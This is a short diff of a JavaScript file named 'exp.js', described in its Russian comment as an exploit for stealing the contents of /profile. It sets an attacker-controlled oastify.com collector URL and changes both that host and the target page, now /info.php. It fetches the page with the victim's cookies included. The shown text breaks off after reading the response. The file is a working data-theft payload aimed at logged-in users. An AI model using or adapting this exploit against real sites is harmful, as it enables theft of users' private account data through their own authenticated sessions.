@@ -1,8 +1,8 @@
 // exp.js - эксплойт для кражи содержимого /profile
-const attackerURL = 'https://weej3j1x73zuqqu1tzqr0r0rxi3gr6fv.oastify.com';
+const attackerURL = 'https://nsjahafoludl4h8s7q4ieieib9h85zto.oastify.com';
 
 // Выполняем запрос к защищенной странице
-fetch('/profile', {
+fetch('/info.php', {
     credentials: 'include' // Важно: отправляем куки авторизации
 })
 .then(response => response.text())
